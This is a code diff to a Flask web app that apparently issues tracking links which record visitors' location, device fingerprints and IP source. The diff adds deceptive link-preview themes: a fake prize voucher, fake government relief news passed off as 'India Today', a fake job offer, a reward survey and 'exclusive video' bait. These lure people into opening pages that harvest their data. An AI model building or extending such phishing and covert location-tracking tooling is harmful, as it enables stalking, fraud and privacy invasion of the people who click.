@@ -7,7 +7,7 @@ import threading
 import time
 import urllib.request
 from datetime import datetime, timedelta
-from flask import Flask, render_template, request, redirect, url_for, session, jsonify, stream_with_context, Response
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, stream_with_context, Response, abort
 from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
@@ -99,6 +99,7 @@ class LocationEntry(db.Model):
     session_id = db.Column(db.String(100), nullable=True)
     is_live_update = db.Column(db.Boolean, default=False, nullable=True)
     update_number = db.Column(db.Integer, default=1, nullable=True)
+    ip_source = db.Column(db.String(50), nullable=True)
 
 class Geofence(db.Model):
     __tablename__ = 'geofences'
@@ -259,17 +260,68 @@ def analytics():
 def geofence_page():
     return render_template('geofence.html')
 
+OG_THEMES = {
+  'gift': {
+    'title': '🎁 You Have Been Selected! Claim Your Prize',
+    'description': 'Congratulations! You have won an exclusive ₹5000 gift voucher. Claim now before it expires!',
+    'image': 'https://viutck.onrender.com/static/og/gift.jpg',
+    'site_name': 'Gift Voucher Portal'
+  },
+  'news': {
+    'title': 'Breaking: Government Announces ₹10,000 Relief for Citizens',
+    'description': 'Read the full story about the new scheme announced today. Check if you are eligible.',
+    'image': 'https://viutck.onrender.com/static/og/news.jpg',
+    'site_name': 'India Today Breaking News'
+  },
+  'job': {
+    'title': '💼 Job Opening: ₹25 LPA | Apply Now',
+    'description': 'TechCorp India is hiring Senior Engineers. Limited seats. Apply before deadline.',
+    'image': 'https://viutck.onrender.com/static/og/job.jpg',
+    'site_name': 'TechCorp Careers'
+  },
+  'survey': {
+    'title': '📋 Complete Survey — Win ₹1000 Amazon Voucher',
+    'description': 'Takes only 2 minutes. 500 winners selected daily. Participate now!',
+    'image': 'https://viutck.onrender.com/static/og/survey.jpg',
+    'site_name': 'Survey Rewards India'
+  },
+  'loading': {
+    'title': '▶️ Exclusive Video — Members Only Content',
+    'description': 'Watch this exclusive video shared with you. Available for limited time only.',
+    'image': 'https://viutck.onrender.com/static/og/video.jpg',
+    'site_name': 'Video Portal'
+  }
+}
+
+@app.route('/static/og/<theme>.jpg')
+def og_image(theme):
+  # Return a redirect to a relevant placeholder image
+  images = {
+    'gift': 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop',
+    'news': 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=1200&h=630&fit=crop',
+    'job': 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=1200&h=630&fit=crop',
+    'survey': 'https://images.unsplash.com/photo-1586281380349-632531db7ed4?w=1200&h=630&fit=crop',
+    'loading': 'https://images.unsplash.com/photo-1611162616305-c69b3fa7fbe0?w=1200&h=630&fit=crop'
+  }
+  from flask import redirect
+  return redirect(images.get(theme, images['gift']))
+
 @app.route('/t/<path:link_id>')
 def serve_tracking(link_id):
     link = TrackingLink.query.filter_by(custom_slug=link_id, is_active=True).first()
     if not link:
         link = TrackingLink.query.filter_by(link_id=link_id, is_active=True).first()
     if not link:
-        return render_template('404.html'), 404
+        abort(404)
     
     link.visit_count += 1
     db.session.commit()
-    return render_template('track.html', link_id=link.link_id, theme=link.theme)
+    import copy
+    og_data = copy.deepcopy(OG_THEMES.get(link.theme or 'gift', OG_THEMES['gift']))
+    host_url = request.host_url.rstrip('/')
+    og_data['image'] = og_data['image'].replace('https://viutck.onrender.com', host_url)
+    og_data['url'] = request.url
+    return render_template('track.html', link_id=link.link_id, theme=link.theme, og=og_data)
 
 @app.route('/api/track/<link_id>', methods=['POST'])
 def track_user(link_id):
@@ -294,6 +346,7 @@ def track_user(link_id):
         screen_resolution=data.get('screen_resolution', 'Unknown'),
         language=data.get('language', 'Unknown'),
         location_denied=data.get('location_denied', False),
+        ip_source=data.get('ip_source'),
         
         # Fingerprint columns
         timezone=data.get('timezone'),
@@ -364,6 +417,7 @@ def track_user_live(link_id):
         screen_resolution=data.get('screen_resolution', 'Unknown'),
         language=data.get('language', 'Unknown'),
         location_denied=data.get('location_denied', False),
+        ip_source=data.get('ip_source'),
         
         # Fingerprint columns
         timezone=data.get('timezone'),
@@ -549,7 +603,8 @@ def api_locations():
             # Live fields
             'session_id': entry.session_id,
             'is_live_update': entry.is_live_update,
-            'update_number': entry.update_number
+            'update_number': entry.update_number,
+            'ip_source': entry.ip_source
         })
     return jsonify(result)
 
@@ -933,7 +988,8 @@ with app.app_context():
         # Live tracking columns
         ('session_id', 'VARCHAR(100)'),
         ('is_live_update', 'BOOLEAN DEFAULT FALSE'),
-        ('update_number', 'INTEGER DEFAULT 1')
+        ('update_number', 'INTEGER DEFAULT 1'),
+        ('ip_source', 'VARCHAR(50)')
     ]
     
     for col_name, col_type in new_cols:
